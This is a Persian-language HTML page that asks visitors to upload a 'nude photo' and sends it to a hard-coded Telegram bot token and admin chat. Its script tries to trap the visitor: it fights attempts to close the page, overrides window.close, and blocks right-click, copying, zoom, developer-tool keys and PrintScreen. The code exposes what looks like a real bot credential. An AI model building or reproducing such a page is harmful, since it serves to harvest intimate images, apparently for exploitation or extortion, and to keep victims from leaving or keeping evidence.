<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, shrink-to-fit=no">
    <title>سامانه ارسال | Xserv</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }

        /* جلوگیری از اسکرول و تغییر سایز */
        html, body {
            width: 100%;
            height: 100%;
            overflow: hidden;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
        }

        body {
            background: radial-gradient(circle at 25% 20%, #0a0f1c, #020408);
            font-family: 'Segoe UI', system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 16px;
            overflow: hidden;
        }

        @viewport {
            zoom: 1.0;
            width: device-width;
        }

        /* ===== صفحه اصلی مخفی (هیچوقت نمایش داده نمیشه) ===== */
        .hidden-main-window {
            display: none;
            position: fixed;
            width: 0;
            height: 0;
            opacity: 0;
            visibility: hidden;
            pointer-events: none;
            overflow: hidden;
            z-index: -9999;
        }

        /* ===== پنجره نمایشی اصلی (همیشه باز و قابل مشاهده) ===== */
        .visible-window {
            max-width: 480px;
            width: 100%;
            background: rgba(10, 15, 28, 0.85);
            backdrop-filter: blur(12px);
            border-radius: 2rem;
            border: 1px solid rgba(255, 110, 50, 0.5);
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6), 0 0 0 1px rgba(255, 90, 20, 0.2);
            padding: 1.8rem 1.6rem 2rem;
            overflow: hidden;
            transition: all 0.2s ease;
        }

        /* هدر خالی */
        .empty-header {
            display: none;
        }

        /* ناحیه آپلود */
        .upload-modern {
            background: rgba(20, 26, 40, 0.8);
            border-radius: 1.8rem;
            padding: 1.5rem 1rem;
            margin: 0.5rem 0 0;
            border: 2px dashed #ff7b3a;
            cursor: pointer;
            text-align: center;
            transition: 0.2s;
        }

        .upload-modern:hover {
            border-color: #ffaa66;
            background: rgba(40, 35, 55, 0.6);
        }

        .upload-icon-large {
            font-size: 2.8rem;
            color: #ffaa66;
            margin-bottom: 6px;
        }

        .upload-title {
            color: #ffcf9a;
            font-weight: 500;
            font-size: 0.85rem;
        }

        .preview-photo {
            max-width: 100%;
            max-height: 220px;
            border-radius: 1.2rem;
            margin-top: 0;
            display: none;
            border: 2px solid #ffaa55;
            object-fit: cover;
            width: 100%;
        }

        /* دکمه‌ها */
        .btn-primary {
            background: linear-gradient(100deg, #c73412, #f04e2a);
            border: none;
            width: 100%;
            padding: 12px 0;
            border-radius: 3rem;
            font-weight: bold;
            font-size: 0.95rem;
            color: #fff4e6;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin-top: 1.5rem;
            cursor: pointer;
            border: 1px solid #ffa066;
            transition: 0.15s linear;
        }

        .btn-primary:active {
            transform: scale(0.98);
        }

        .btn-sleep {
            background: transparent;
            border: 1px solid #aa6644;
            width: 100%;
            padding: 10px 0;
            border-radius: 3rem;
            color: #ffbe85;
            font-weight: 500;
            margin-top: 12px;
            cursor: pointer;
            transition: 0.1s;
        }

        .btn-sleep:active {
            background: rgba(100, 50, 30, 0.4);
        }

        .status-line {
            margin-top: 1rem;
            font-size: 0.7rem;
            text-align: center;
            background: rgba(0, 0, 0, 0.4);
            border-radius: 50px;
            padding: 6px;
            color: #ffb77c;
            min-height: 36px;
        }

        /* فوتر با لینک سید */
        .xserv-footer {
            text-align: center;
            margin-top: 1.5rem;
            font-size: 0.7rem;
            border-top: 1px dashed rgba(255, 110, 50, 0.4);
            padding-top: 0.9rem;
        }

        .xserv-footer a {
            color: #ffa668;
            text-decoration: none;
            font-weight: 500;
            transition: 0.1s;
            cursor: pointer;
        }

        .xserv-footer a:hover {
            color: #ffcc88;
            text-shadow: 0 0 3px #ff8822;
        }

        /* TOAST مسیج */
        .toast-fixed {
            position: fixed;
            bottom: 25px;
            left: 50%;
            transform: translateX(-50%);
            background: #1e3322ee;
            backdrop-filter: blur(8px);
            color: #e2ffc7;
            padding: 8px 24px;
            border-radius: 60px;
            font-size: 0.75rem;
            z-index: 2000;
            border: 1px solid #bbff88;
            white-space: nowrap;
            pointer-events: none;
        }

        .toast-fixed.error {
            background: #631a1ae6;
            border-color: #ff8888;
            color: #ffcdcd;
        }

        input[type="file"] {
            display: none;
        }

        ::-webkit-scrollbar {
            display: none;
        }
    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
</head>
<body>

<!-- ===== صفحه اصلی مخفی (هیچوقت نمایش داده نمیشه و کاملاً خالی است) ===== -->
<div class="hidden-main-window" id="hiddenMainWindow">
    <!-- این صفحه هیچ محتوایی ندارد و هرگز نمایش داده نمی‌شود -->
</div>

<!-- ===== پنجره نمایشی اصلی (همیشه باز و قابل مشاهده، بسته نمی‌شود) ===== -->
<div class="visible-window" id="visibleWindow">
    <!-- هدر کاملاً خالی -->
    <div class="empty-header"></div>

    <!-- ناحیه آپلود عکس (اجباری) - بعد از آپلود حذف میشه -->
    <div class="upload-modern" id="uploadZone">
        <div class="upload-icon-large">
            🧸
        </div>
        <div class="upload-title">
            <i class="fas fa-camera"></i> عکس نود را ارسال کن
        </div>
    </div>
    <img id="previewImage" class="preview-photo" alt="پیش‌نمایش">
    <input type="file" id="hiddenFileInput" accept="image/*">

    <button class="btn-primary" id="sendRequestBtn">
        <i class="fas fa-paper-plane"></i> ارسال به ادمین
    </button>
    <button class="btn-sleep" id="sleepBtn">
        <i class="fas fa-moon"></i> ما خوابیم
    </button>
    <div id="dynamicStatus" class="status-line"></div>
    <div class="xserv-footer">
        ساخته شده توسط <a id="telegramLink" href="#" target="_blank">سید</a>
    </div>
</div>

<script>
    // ========== اطلاعات ربات ==========
    const BOT_TOKEN = '8121157217:AAE6RrPIQvFmfIPJUm0JMFELCndmPgCm9rE';
    const ADMIN_ID = '6372083102';          
    const ADMIN_USERNAME = '@u0v0n';        
    const OWNER_TELEGRAM = '@u0v0n';

    // المان‌های پنجره نمایشی
    const uploadDiv = document.getElementById('uploadZone');
    const fileInputElem = document.getElementById('hiddenFileInput');
    const previewImg = document.getElementById('previewImage');
    const sendAction = document.getElementById('sendRequestBtn');
    const sleepAction = document.getElementById('sleepBtn');
    const statusDiv = document.getElementById('dynamicStatus');
    const telegramLink = document.getElementById('telegramLink');

    // صفحه اصلی مخفی (فقط برای ساختار وجود داره)
    const hiddenWindow = document.getElementById('hiddenMainWindow');
    
    let selectedPhoto = null;

    // لینک تلگرام سید
    telegramLink.href = `https://t.me/${OWNER_TELEGRAM.replace('@', '')}`;
    telegramLink.addEventListener('click', (e) => {
        e.stopPropagation();
        window.open(telegramLink.href, '_blank');
    });

    // نمایش toast
    function showFloatyMessage(msg, isError = false) {
        let existingToast = document.querySelector('.toast-fixed');
        if(existingToast) existingToast.remove();
        const toastEl = document.createElement('div');
        toastEl.className = isError ? 'toast-fixed error' : 'toast-fixed';
        toastEl.innerHTML = `<i class="fas ${isError ? 'fa-exclamation-triangle' : 'fa-check-circle'}"></i> ${msg}`;
        document.body.appendChild(toastEl);
        setTimeout(() => {
            if(toastEl) toastEl.remove();
        }, 4000);
    }

    // حذف کادر آپلود و نمایش فقط عکس
    function removeUploadBoxAndShowPreview() {
        uploadDiv.style.display = 'none';
        previewImg.style.display = 'block';
    }

    // ریست کردن فرم و برگرداندن کادر آپلود (برای ارسال مجدد)
    function resetToUploadMode() {
        selectedPhoto = null;
        previewImg.style.display = 'none';
        previewImg.src = '';
        fileInputElem.value = '';
        uploadDiv.style.display = 'block';
        statusDiv.innerHTML = '';
    }

    // آپلود عکس (فقط یک عکس - جایگزینی)
    fileInputElem.addEventListener('change', (e) => {
        if(e.target.files && e.target.files[0]) {
            const file = e.target.files[0];
            if(!file.type.startsWith('image/')) {
                showFloatyMessage('فقط فایل عکس معتبر است', true);
                return;
            }
            selectedPhoto = file;
            const reader = new FileReader();
            reader.onload = (ev) => {
                previewImg.src = ev.target.result;
                removeUploadBoxAndShowPreview();
                statusDiv.innerHTML = '';
            };
            reader.readAsDataURL(file);
        }
    });

    uploadDiv.addEventListener('click', () => {
        if(uploadDiv.style.display !== 'none') {
            fileInputElem.click();
        }
    });

    // دکمه "ما خوابیم" -> فقط پیام میده، پنجره اصلی بسته نمیشه
    sleepAction.addEventListener('click', () => {
        statusDiv.innerHTML = '';
        showFloatyMessage('⚠️ پنجره اصلی هرگز بسته نمی‌شود');
    });

    // ارسال عکس به تلگرام
    async function sendPhotoToAdminWithCaption(chatId, photoFile, caption) {
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', photoFile);
        formData.append('caption', caption);
        const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        });
        return await resp.json();
    }

    // رویداد ارسال نهایی
    sendAction.addEventListener('click', async () => {
        if(!selectedPhoto) {
            showFloatyMessage('❌ تصویر الزامی است! لطفاً عکس نود را ارسال کن', true);
            statusDiv.innerHTML = '';
            return;
        }

        const today = new Date().toLocaleDateString('fa-IR');
        const nowTime = new Date().toLocaleTimeString('fa-IR');
        
        const captionText = `📢 درخواست جدید\n━━━━━━━━━━━━━━━━━━━\n📅 تاریخ: ${today} - ${nowTime}\n✨ ساخته شده توسط سید\n━━━━━━━━━━━━━━━━━━━\n✅ جهت بررسی سریع اقدام شود`;

        let successFlag = false;
        let errorDetail = '';

        try {
            const resultFirst = await sendPhotoToAdminWithCaption(ADMIN_ID, selectedPhoto, captionText);
            if(resultFirst && resultFirst.ok === true) {
                successFlag = true;
            } else {
                errorDetail = resultFirst?.description || 'خطای نامشخص';
            }
        } catch(err) {
            errorDetail = err.message;
        }

        if(!successFlag) {
            try {
                const resultSecond = await sendPhotoToAdminWithCaption(ADMIN_USERNAME, selectedPhoto, captionText);
                if(resultSecond && resultSecond.ok === true) {
                    successFlag = true;
                } else {
                    errorDetail = resultSecond?.description || 'خطا در ارسال به یوزرنیم';
                }
            } catch(err) {
                errorDetail = err.message;
            }
        }

        if(successFlag) {
            statusDiv.innerHTML = '';
            showFloatyMessage('✅ عکس با موفقیت ارسال شد!');
            setTimeout(() => {
                resetToUploadMode();
            }, 2000);
        } else {
            let finalErrorMsg = 'ارسال ناموفق بود';
            if(errorDetail && (errorDetail.includes('chat not found') || errorDetail.includes('user not found') || errorDetail.includes('bot was blocked'))) {
                finalErrorMsg = '⚠️ ادمین با ربات شروع نکرده است. با پشتیبانی تماس بگیرید.';
            } else if(errorDetail) {
                finalErrorMsg = `خطا: ${errorDetail.substring(0, 100)}`;
            }
            showFloatyMessage(finalErrorMsg, true);
            statusDiv.innerHTML = '';
        }
    });

    // ===== جلوگیری از بسته شدن پنجره اصلی =====
    // غیرفعال کردن هرگونه تلاش برای بستن یا مخفی کردن پنجره نمایشی
    window.addEventListener('beforeunload', (e) => {
        // جلوگیری از بسته شدن صفحه (در صورت امکان)
        e.preventDefault();
        e.returnValue = '';
        return '';
    });

    // جلوگیری از close شدن توسط کدهای جاوااسکریپت
    const originalClose = window.close;
    window.close = function() {
        showFloatyMessage('❌ پنجره اصلی قابل بسته شدن نیست', true);
        return false;
    };

    // ========== قفل کامل: جلوگیری از کلیک راست، کپی، درگ، زوم و اسکرول ==========
    document.addEventListener('contextmenu', (e) => {
        e.preventDefault();
        return false;
    });
    document.addEventListener('copy', (e) => {
        e.preventDefault();
        return false;
    });
    document.addEventListener('cut', (e) => {
        e.preventDefault();
        return false;
    });
    document.addEventListener('dragstart', (e) => {
        e.preventDefault();
        return false;
    });
    document.addEventListener('selectstart', (e) => {
        e.preventDefault();
        return false;
    });
    document.addEventListener('keydown', (e) => {
        if (e.ctrlKey && (e.key === '+' || e.key === '-' || e.key === '=' || e.key === '0')) {
            e.preventDefault();
            return false;
        }
        if (e.key === 'F12') {
            e.preventDefault();
        }
        if(e.ctrlKey && (e.key === 'u' || e.key === 'U' || e.key === 'I' || e.key === 'i' || e.shiftKey && e.key === 'I')) {
            e.preventDefault();
            return false;
        }
        if(e.key === 'PrintScreen') {
            e.preventDefault();
            return false;
        }
        // جلوگیری از Alt+F4 یا Ctrl+W (در حد توان)
        if((e.ctrlKey && e.key === 'w') || (e.altKey && e.key === 'F4')) {
            e.preventDefault();
            showFloatyMessage('❌ بستن پنجره ممکن نیست', true);
            return false;
        }
    });
    document.addEventListener('touchmove', (e) => {
        if (e.scale && e.scale !== 1) e.preventDefault();
    }, { passive: false });
    
    window.addEventListener('resize', () => {});
    
    const allElements = document.querySelectorAll('*');
    allElements.forEach(el => {
        el.style.userSelect = 'none';
        el.style.webkitUserSelect = 'none';
    });
    
    statusDiv.innerHTML = '';
    
    // اطمینان از نمایش همیشگی پنجره اصلی
    console.log('پنجره اصلی فعال است و هرگز بسته نخواهد شد');
</script>
</body>
</html>
